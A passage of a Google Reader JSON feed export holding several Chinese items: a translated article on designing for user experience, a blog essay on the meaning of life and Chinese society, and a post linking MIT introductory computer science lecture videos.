helvetica,arial,helvetica,sans-serif;color:#2f2f2f;border-bottom-width:3px;border-bottom-style:solid;border-bottom-color:#2f2f2f;font-family:&#39;droid sans&#39;,arial,sans-serif;line-height:20px;font-size:1em\">我们可以为了用户体验而设计</h3> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><a href=\"http://www.flickr.com/photos/foilman/2762577980/\" style=\"color:#3151a2\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/rollercoaster.jpg\" alt=\"Rollercoaster in Why User Experience Cannot Be Designed\" width=\"500\" height=\"282\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;display:inline\"></a><br> <em> 过山车是有趣的、激动人心的和令人兴奋的还是仅仅惊人的恐怖？这很难说。</em><em>(图片: <a href=\"http://www.flickr.com/photos/foilman/2762577980/\" style=\"color:#3151a2\">foilman</a>)</em></p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">       许多设计师给自己贴上“用户体验设计师”的标签。这意味着对设计师自身能力极大的自信；这暗示用户体验可以被设计。但是正如前文所述，我们不能这么做。反而我们可以为用户体验而设计。我们可以设计产品或者服务，而且我们再设计它的时候大脑中可以有一个特定的用户体验。当然，这不能保证我们的产品会像我们预想的方式一样被赞赏（再次提醒，见 Hassenzahl模型）。我们既不能设计用户的期望也不能设计他们使用我们产品时的处境。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        正如<span style=\"line-height:21px\"><a href=\"http://www.informationarchitects.jp/en/can-experience-be-designed/\">as Oliver Reichenstein points out</a>所指出的那样，</span><span style=\"line-height:21px\">用户评论我们产品的本质的方式</span><span style=\"line-height:21px\">这个问题，必然不会有一个很好的办法解决。电影、修辞和品牌展示同样多：他们预测特定体验，并且经常也能够达到目标。</span></p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">       当然，一个激动人心的电影可能在影院观看比在家里观看更加激动人心，因为物理环境（处境决定用户体验）不同。同理，广告的影响也总是基于播放的情形和消费者的批判意识和知识。商业广告是为了特定体验而设计，但是他们呢成功的程度不仅仅基于商业广告本身。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        设计用户体验和为用户体验而设计之间的区别非常细微但很重要。这可以帮助我们理解并且提示我们的局限性。这可以帮助我们西靠我们如何使用户体验成为我们所预想的样子。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">     比如，一个观点曾被提出过，用户体验是特定因素的叠加，比如有趣、情感、易用性、激励性、合作体验、用户参与和用户约束。反过来说，我们在为用户体验而设计的时候必须基于我们设想的产品被感知的方式而包含其中的一些因素。如果我们想要程序变得有趣，那么我们应该加入一些娱乐的特点，一个玩笑，一个挑战性的测验，一段有趣的视频，一个具有竞争力的界面，或者其他东西。我们要牢牢记住，无论如何，作为设计师，我们从不能真正预测用户接受我们程序的乐趣。用户有不同的标准，甚至有些时候他们根本不想被娱乐。</p> <h3 style=\"padding-top:10px;padding-right:0px;padding-bottom:3px;padding-left:0px;margin-bottom:18px;font:normal normal normal 2.5em/1.33em helvetica,arial,helvetica,sans-serif;color:#2f2f2f;border-bottom-width:3px;border-bottom-style:solid;border-bottom-color:#2f2f2f;font-family:&#39;droid sans&#39;,arial,sans-serif;line-height:20px;font-size:1em\">额外练习：如何为用户体验而设计</h3> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/facets-of-ux.jpg\" alt=\"Facets-of-ux in Why User Experience Cannot Be Designed\" width=\"500\" height=\"350\" style=\"margin-top:6px;margin-right:0px;margin-bottom:6px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;display:inline\"><br> <em>Peter Morville的用户体验各种属性 (图像: <a href=\"http://semanticstudios.com/publications/semantics/000029.php\" style=\"color:#3151a2\">Semantic Studios</a>)</em></p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">理解用户体验</h4> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        如果我们想要为了用户体验而设计，那么我们需要理解用户体验是什么。比说，知道哪个变量让用户给予产品积极的评价，而的模型就是为了达到这一目的的一个模型。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        其他的模型也同样被提出过，比如Peter的“用户体验的七个方面”。这里，用户体验被分为有益的、可用的、令人满意的、可靠的和有价值的。正如你可能会注意到的一样，这些方面非常符合Hassenzahl的模型：有益的、可发现的。可靠的和易理解的都可以被认为使用属性，而令人满意的和有价值的则可被认为享乐属性。</p> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        如前所述，用户体验被认为是特定属性的叠加。其他的一些被提出的模型，其中的一些在文章底部有链接。</p> <h4 style=\"margin-top:35px;margin-right:0px;margin-bottom:20px;margin-left:0px;font:italic normal normal 1.9em/normal georgia,&#39;times new roman&#39;,times,serif;color:#d93315;font-family:&#39;droid sans&#39;,arial,sans-serif;font-size:25px;font-style:normal;line-height:20px\">理解用户</h4> <span style=\"line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">        跟随这一原则，我们应该理解我们的用户。传统的方法必然是适用的，比如通过调查、采访和观察来做用户研究。还有，用户模型也曾被提出是一种为用户体验设计和获得用户体验属性的手段。Smashing杂志已经呈现了一系列的方法。<br> </span> <p><font color=\"#D93315\" face=\"&#39;droid sans&#39;, arial, sans-serif\"><span style=\"font-size:25px\">超越预期</span></font></p> <p><span style=\"color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:14px\">        最终，给予用户想要的--而且比这更多一些。为了为了鼓励用户高效和有目的的使用你的服务，要使他们思考。“哇塞，这个程序真是天才的设计！”超越他们的预期。如果你这么做了，那么他们将不仅仅是不得不用你的网站或者程序，而是很想用。</span></p> <h3 style=\"padding-top:10px;padding-right:0px;padding-bottom:3px;padding-left:0px;margin-bottom:18px;font:normal normal normal 2.5em/1.33em helvetica,arial,helvetica,sans-serif;color:#2f2f2f;border-bottom-width:3px;border-bottom-style:solid;border-bottom-color:#2f2f2f;font-family:&#39;droid sans&#39;,arial,sans-serif;line-height:20px;font-size:1em\">其他资源</h3> <p style=\"margin-bottom:1.15em;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\">了解更多关于用户体验的事情，推荐阅读下面文章:</p> <ul style=\"list-style-type:square;line-height:20px;color:#1e1e1e;font-family:verdana,arial,geneva,helvetica,sans-serif;font-size:1em\"><li style=\"padding-bottom:0.45em\"><a href=\"http://www.smashingmagazine.com/2010/10/05/what-is-user-experience-design-overview-tools-and-resources/\" style=\"color:#3151a2\">What Is User Experience Design? Overview, Tools and Resources</a><br> 什么是用户体验设计？总得来说，是工具和资源                                 用户体验很好的介绍，还有为体验ershe推荐的技术和有用的工具</li> <li style=\"padding-bottom:0.45em\"><a href=\"http://www.uxbooth.com/blog/8-must-see-ux-diagrams/\" style=\"color:#3151a2\">8 Must-See UX Diagrams</a><br> 8个必看的用户体验图解                                                             极为优秀的用户体验视觉化理念和碎片合集</li> <li style=\"padding-bottom:0.45em\"><a href=\"http://www.smashingmagazine.com/2008/10/07/retro-and-vintage-in-modern-web-design/\" style=\"color:#3151a2\">Retro and Vintage in Modern Web Design</a><br> An extensive showcase of inspiring websites that are graphically designed to elicit memories.现代网页设计的复古设计和现代设计</li> <li style=\"padding-bottom:0.45em\"><a href=\"http://uxmyths.com/\" style=\"color:#3151a2\">UX Myths</a><br> 用户体验神话                                                                         一个专注于揭开用户体验谜团的网站</li> <li style=\"padding-bottom:0.45em\"><a href=\"http://books.google.com/books?id=QKYPdcI-av8C&amp;lpg=PA31&amp;ots=fhpyp6-jRi&amp;dq=Hassenzahls%20model&amp;hl=no&amp;pg=PA31#v=onepage&amp;q&amp;f=false\" style=\"color:#3151a2\">The Thing and I: Understanding the Relationship Between a User and a Product</a><br> 产品和用户：理解用户和产品之间的联系      免费提供的本篇文章中所提到的Hassenzahl的用户体验模型的文章</li> </ul> </div> </div><p><a href=\"http://article.yeeyan.org/view/118604/180607#newComment\">添加新评论</a></p><p><strong>相关文章：</strong></p><p>  <a href=\"http://article.yeeyan.org/view/215925/182542?from=rss_related\">【图集】儿童房设计案例</a></p><p>  <a href=\"http://article.yeeyan.org/view/215925/182389?from=rss_related\">小户型的设计大学问——如何利用室内装饰物增强空间效果</a></p><p>  <a href=\"http://article.yeeyan.org/view/163202/181709?from=rss_related\">30个出众运用颜色的网站范例</a></p><p>  <a href=\"http://article.yeeyan.org/view/215474/181700?from=rss_related\">提高Wireframe表达能力的三个策略</a></p><p>  <a href=\"http://article.yeeyan.org/view/215472/181691?from=rss_related\">Burbery 向奢侈品大本营注入新活力</a></p><img src=\"http://www1.feedsky.com/t1/489920373/yeeyan/feedsky/s.gif?r=http://article.yeeyan.org/view/118604/180607\" border=\"0\" height=\"0\" width=\"0\"><p><a href=\"http://www1.feedsky.com/r/l/feedsky/yeeyan/489920373/art01.html\"><img border=\"0\" ismap src=\"http://www1.feedsky.com/r/i/feedsky/yeeyan/489920373/art01.gif\"></a></p>"
    },
    "author" : "风清扬",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.feedsky.com/yeeyan",
      "title" : "译言-每日精品译文推荐",
      "htmlUrl" : "http://www.yeeyan.org"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1301468951896",
    "timestampUsec" : "1301468951896526",
    "id" : "tag:google.com,2005:reader/item/1e470aa8e296533c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "后弦 &lt;娃娃脸&gt; 个人最喜欢的华语R&amp;B歌手[115]",
    "published" : 1301468951,
    "updated" : 1301468951,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-39975.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : " "
    },
    "author" : "xsdr",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1300457788616",
    "timestampUsec" : "1300457788616499",
    "id" : "tag:google.com,2005:reader/item/48f87f88247aece2",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "天涯寻路" ],
    "title" : "生命的意义–“形而上”的思考系列之（一）",
    "published" : 1298598290,
    "updated" : 1298598290,
    "alternate" : [ {
      "href" : "http://winstonwhy.wordpress.com/2011/02/25/%e7%94%9f%e5%91%bd%e7%9a%84%e6%84%8f%e4%b9%89-%e2%80%9c%e5%bd%a2%e8%80%8c%e4%b8%8a%e2%80%9d%e7%9a%84%e6%80%9d%e8%80%83%e7%b3%bb%e5%88%97%e4%b9%8b%ef%bc%88%e4%b8%80%ef%bc%89/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>生命的意义–“形而上”的思考系列之（一）</p>\n<p>人，人类，human being，作为一种存在形式，在肉体上，和其他动物毫无二致，都依赖新陈代谢维持生存，生老病死，循环往复。其区别于动物的地方在于强大而丰富的精神世界，这世界的强大和丰富远超过人类所能到达的空间界限，包罗万象，远及宇宙边缘，甚至缥缈的虚幻世界。也正因此，人类的另一显著区别于动物的地方在于，其不仅仅适应生存的环境，更加主动的改变环境（改善或破坏）。人的这种特征决定了作为一个人类个体的我们的，生命的意义。</p>\n<p>首先，作为一个脱胎于动物界的一个种群，人类的生存本身就具有动物性的意义：寻找食物以维持生存迹象，寻找或改变生存环境以抵御外部侵袭，交媾以繁衍后代，传授后代生存技能以使种群延续。人类的各种社会活动其实都能找到在动物界的投影。</p>\n<p>其次，作为一个靠自身努力进化而脱离了一般动物界的高级的存在，人类还有属于自己的精神世界：不断探索着未知领域，无论是在精神世界里还是在物质世界里；不断改进生产方式，用以更高效率的维持自身生命和改善生存环境；不断寻找调整自身和其他同种群个体之间的关系以维持和睦（和平），诸如此类。</p>\n<p>整个人类的动物性和人性的基础上，作为人类个体的我们的生命意义的下限和上限也便确定下来。最基本的意义，独立维持自身的生存，为自己创造生存的环境（因此，我绝对反对所谓“啃老”，因为那是一种放弃了作为人的最基本的存在意义而将责任推给其他个体的行为）。终极的目标，探索人类的极限，改善整个人类的生存环境甚至生命方式（有些科幻）。这种探索活动不仅限于智力，也包括体力方面，也因此，对于“真正”的运动员（反例：中国男足），我一向保有尊敬，也不觉得他们获得高收入是一种不合理，他们正在做的其实是一种对于人类自身极限的挑战，所以他们应该获得整个人类的支持。</p>\n<p>一个人，如果体力和智力方面都处于弱势，那么他有权利选择苟延残喘，虚无度日，因为只要他能够独立维持自己的生存，便是尽到了最基本的义务。与此相对的，每个人，特别是在智力体力方面位于前列的人，都应该有更高的追求：推动人类的前进。</p>\n<p>我们不可能要求每个同类都有理想和追求，但相对来说，其实每个人的理想和追求也是一种最基本的存在意义。因为，在人类未知领域里可能面临的足以阻断人类延续的危机是十分可能的，要想避免危机的到来，只有每个人类个体都在追求理想的同时充分发挥自己的光热，推动人类的进步（最简单的情况，你的劳动如果能够多养活一个人，那么那个被你养活的人就可能去做一些推动人类进步的事情）。打个比方，从概率上来讲，地球随时有可能面临小行星的撞击（甚至有科学家推断出XX万年前地球已经遭受过一次大规模的毁灭性的撞击以至大部分当时的生物灭绝了）。如果我们安于现状的话，无异于坐以待毙。为了人类的延续，每个人都有责任紧张起来，充分发挥自己的光热，团结那些智力上更高一筹的同类去探索可行的解决方案，比如，外太空事业，最终找到另一个适宜居住的星球以分散风险（又有些科幻了）。由此可以看出，每个人都尽自己最大的努力，严格来说也是一种最基本的生存意义–避免可能的危机影响到人类的存在。</p>\n<p>按照上面的观点，可以引申出以下几个结论：</p>\n<p>结论的作用域为整个人类，但这里更特别关注中国的情况（中国以外的我并不是十分了解）</p>\n<p>第一，当今的娱乐业过分发达了。</p>\n<p>诚然，娱乐也是人类生活的一部分，从某种意义上来说，改变了人的精神世界（改善或荼毒），客观上可以促进人类的进步。但如今的娱乐业，特别是国内的娱乐业，可以说，正面的东西或能够看到有所改善的东西实在是凤毛麟角，总出产中只有极少数存在现实意义，绝大多数都是垃圾：同质现象严重，换几个演员就可以重拍一部电视剧或电影；粗制滥造，根本不经过科学的加工和整理就敢拿出来误导人群，不尊重事实；耗资巨大，却纯属浪费。虽然那些垃圾不是用我的钱做的，但考虑到人类的整体产出，这些垃圾耗费了十分巨大的物质财富却没有出产一点有营养的东西，怎能不说是一种对人类进步的危害？但关键问题并不在此，概率上来讲，即使你一心做好娱乐，也有可能由于方法不对或思路不对而产出垃圾；问题是有些人明知是垃圾，但只要能赚钱，就敢去做，这样的人是我抨击的对象，因为他们忘记了人类最起码的生存的意义所在。</p>\n<p>第二，对于科学的态度仍然不够尊重，特别是在中国（或者说，仅限于中国）。这是一个很严重的问题，也是很多恶性循环的罪魁祸首。</p>\n<p>首先，科学工作者应当是一群人类精英，是一些值得你耗费多少人工养活的，为了人类的将来而寻找智力上的突破的人。他们应当得到物质和精神上的全面的尊重。他们的劳动推动了社会的进步，或者使你的生活免于受到一些至今看不见的危机的影响。</p>\n<p>而在中国，科学研究人员被称为“烈士”“圣斗士”，是一群被认为找不到工作或无法适应现代社会的顽固不化的人群；教授被称为“叫兽”，被认为是只会奴役学生甚至戕害学生的恶徒（这并非无中生有，老爸公司合作过的一个生化学教授带的博士生唯一的用途就是帮他操作研究室机器生产萃取营养品用以谋取暴利）。</p>\n<p>这种现象是一个恶性循环：</p>\n<p>研究人员（特别是教授级别的）不能够得到起码的尊重，社会地位和经济地位没有保证，自身心理便失衡，将自己肩负的责任忘却变为单纯靠自己所掌握的知识和权利来谋取不正当利益。</p>\n<p>他们的学生在学术上没有得到多少提携，反而学会了许多以权谋私的恶习，将来成为他们之后只会以同样的方式做同样的或更卑劣的事情。</p>\n<p>整个学术界的所作所为更加被社会鄙夷，造成了研究人员更加得不到尊重。</p>\n<p>这样一个循环里，科学研究的产出实在是微乎其微（要知道即使在发达国家的科学界，新的突破也是一个概率上的问题，不能保证大规模的有效的科学研究更是不要奢望有什么创举）。我想之所以在这片土地上始终长不出诺北儿的苗儿，很大原因在于此。</p>\n<p>第三，年轻人，特别是在智力上体力上有一定优势的年轻人，一定不要达到温饱或小康的经济状态便满足了，理想及实现理想的过程才是人生存的意义所在。</p>\n<p>中国这片神奇的土地，总能孕育出神奇的人（虽然我也是其中之一），他们没有理想，或理想早已向现实低头，他们以“年收XX，有车有房”为成功标准，他们以生活安定为最终目标。我并不想刻意拔高理想的重要，只是想说，人不一定要有多崇高的理想，但人不可以没有理想。哪怕只是想要做出一个小应用程序以改变现实生活的不便，那也是为人类的进步做出了贡献。一切以金钱为衡量标准加上现行的教育体制忽略了理想的教育使更多的年轻人放弃了心中的热血最终变为了金钱的奴隶。一个活生生的例子就是我弟弟，本来是个很有sense的desiner，做出的视频和动画在网上可以看到，但由于毕业的学校不好，找不到合适的工作，最终去了保险公司。起初他找工作的时候来问我，我只对他说，做你喜欢的和希望自己能够做出成绩的就好了。而他母亲，也是我的姨，一定要托关系走门子把他送到一个保险公司，说能赚钱养家。说实话我很失望，我不知道他在新公司里是否做的很好，但我知道这一定不是他的理想。对于理想的坚守，始终敌不过金钱社会的冲击。但记得一部很喜欢的印度电影，叫三傻大闹宝莱坞，里面男主角有一句话让我铭记一生：只要始终追求卓越，成功自然随之而来。太在乎结果，反倒忽略了实现理想的过程中的乐趣，最终连理想也放弃了。成功？没有理想的成功是不存在的。</p>\n<p>第四，“负产出”更应当受到足够重视。</p>\n<p>（之后还计划写一篇关于鸡的屁的文章，这里先随便侃侃）</p>\n<p>今年中国的头等大事，貌似不可能缺少的就是，我们的鸡的屁终于成了世界第二了！</p>\n<p>严格意义来说，我们的鸡的屁确实为人类做出了很大的贡献（当然也做出了很大的牺牲），我们用我们的勤劳人民的辛勤工作，支援了世界上绝大多数发达国家的人民过上好日子：我们享受着世界上最发达的物价（特别是房价），最发达的税收（看看身边的armani卖多少钱吧），最发达的行政管理能力（具有正规军实力的城管和国保队伍），依靠近乎百年前的生产力水平，为全世界的水深火热的劳苦大众提供了廉价的商品，让他们可以在仅仅维持我们十倍左右的收入的同时，享受到几乎和我们同等的消费。当然，也间接促成了发达国家的科学家们可以专心找到人类进步的方法。人类的进步，离不开我们这个占了世界五分之一人口的国度。</p>\n<p>但是，且不论究竟鸡的屁意义何在，只说我们的鸡的屁的“贡献率”的问题：我们在产出的同时，究竟毁灭了多少？</p>\n<p>你拆了一栋房子，回头又建了一栋，再拆，再建，这每一拆，每一建，都是累加到了鸡的屁中，但这个无限不收敛数列的极大值只是一栋房子。我们毁了一片林子，耕种了粮食，但鸡的屁只计算了耕种的所得，却没有计算由于毁掉的林子所带来的负面影响。我们计算了医院的一年的营业额，却没有计算贡献了这些营业额的病人们究竟是因为何种原因而得了病，这些原因中有多少是随着其他鸡的屁的增长而新出现的。</p>\n<p>林林总总，诸如此类。这种杀敌一千自损八百的行为，在中国可以被计算为“总计干掉一千八”，不可笑么？但你笑的出来么？</p>\n<p>总结：</p>\n<p>人，之所以为人，非兽，非神，在于人出身于兽，却更想作神。一个人的一生相对于浩瀚穹宇简直如白驹过隙，转瞬即逝。人类对于自身的认识和改进却在一代代繁衍延续中随着时间的流逝而永无止境。当我们意识到了自身生命的意义的时候，正是重新审视从前的所为，正视如今的责任，创造自己未来的时刻。（完）</p>\n<br>  <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gocomments/winstonwhy.wordpress.com/264/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/comments/winstonwhy.wordpress.com/264/\"></a> <img alt=\"\" border=\"0\" src=\"http://stats.wordpress.com/b.gif?host=winstonwhy.wordpress.com&amp;blog=16282571&amp;post=264&amp;subd=winstonwhy&amp;ref=&amp;feed=1\" width=\"1\" height=\"1\">"
    },
    "author" : "WinstonWhyNotCry",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://cid-cfefbbf91d84de2f.users.api.live.net/Users(-3463342909808124369)/Main?$format=rss20",
      "title" : "无知者的掘墓人",
      "htmlUrl" : "http://winstonwhy.wordpress.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1300455117556",
    "timestampUsec" : "1300455117556176",
    "id" : "tag:google.com,2005:reader/item/10b98494c2f2351e",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/like", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/tracking-body-link-used", "技术读物", "杂项资源", "程序设计", "编程语言", "ebook", "MIT", "Programming" ],
    "title" : "（麻省理工免费课程）计算机科学和编程导论",
    "published" : 1298852707,
    "updated" : 1298852707,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/3723.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>以前本站推荐过<a href=\"http://coolshell.cn/articles/2474.html\">麻省理工的C/C++的课程</a>，今天在他们的网站看到上有一组关于<a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/\">计算机科学和编程导论的免费公开课</a>（视频是Youtube的），我看了几个课程，我觉得讲得很系统啊，而且有一点一通百通的感觉。虽然是理论课，但是可以感到我国的教育还是有很大差距的。这个组课程推荐给大家（需要翻墙），视频都有字幕，计算机科学系毕业的同学应该会很容易听懂。强烈推荐。（网友Aslan指出已经有人搬运到优酷上了，<a href=\"http://www.youku.com/playlist_show/id_3940564_ascending_1_mode_pic_page_1.html\">链接在这里</a>，遗憾的是没有字幕，另外，不知道为什么会说是Python学习）</p>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"1: Introduction and Goals; Data Types, Operators, and Variables\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-1\"> \n<p></p></a><a title=\"1: Introduction and Goals; Data Types, Operators, and Variables\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-1\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-1/lec01.jpg\" alt=\"\"></a></td>\n<td>\n<p>1: Introduction and Goals; Data Types, Operators, and Variables</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-1\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p0.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"2: Branching, Conditionals, and Iteration\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-2\"> \n<p></p></a><a title=\"2: Branching, Conditionals, and Iteration\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-2\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-2/lec02.jpg\" alt=\"\"></a></td>\n<td>\n<p>2: Branching, Conditionals, and Iteration</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-2\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p1.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"3: Common Code Patterns: Iterative Programs\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-3\"> \n<p></p></a><a title=\"3: Common Code Patterns: Iterative Programs\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-3\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-3/lec03.jpg\" alt=\"\"></a></td>\n<td>\n<p>3: Common Code Patterns: Iterative Programs</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-3\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p2.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<p><span></span></p>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"4: Abstraction through Functions; Introduction to Recursion\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-4\"> \n<p></p></a><a title=\"4: Abstraction through Functions; Introduction to Recursion\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-4\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-4/lec04.jpg\" alt=\"\"></a></td>\n<td>\n<p>4: Abstraction through Functions; Introduction to Recursion</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-4\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p3.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"5: Floating Point Numbers, Successive Refinement, Finding Roots\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-5\"> \n<p></p></a><a title=\"5: Floating Point Numbers, Successive Refinement, Finding Roots\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-5\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-5/lec05.jpg\" alt=\"\"></a></td>\n<td>\n<p>5: Floating Point Numbers, Successive Refinement, Finding Roots</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-5\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p4.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table width=\"100%\">\n<tbody>\n<tr>\n<td width=\"120\"><a title=\"6: Bisection Methods, Newton/Raphson, Introduction to Lists\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-6\"> \n<p></p></a><a title=\"6: Bisection Methods, Newton/Raphson, Introduction to Lists\" href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-6\"><img src=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-6/lec06.jpg\" alt=\"\"></a></td>\n<td>\n<p>6: Bisection Methods, Newton/Raphson, Introduction to Lists</p>\n<p><a href=\"http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-00-introduction-to-computer-science-and-programming-fall-2008/video-lectures/lecture-6\">Youtube（英文字幕）</a></p>\n<p><a href=\"http://v.youku.com/v_playlist/f4862914o1p5.html\">优酷（无字幕）</a></p></td>\n</tr>\n</tbody>\n</table>\n<table 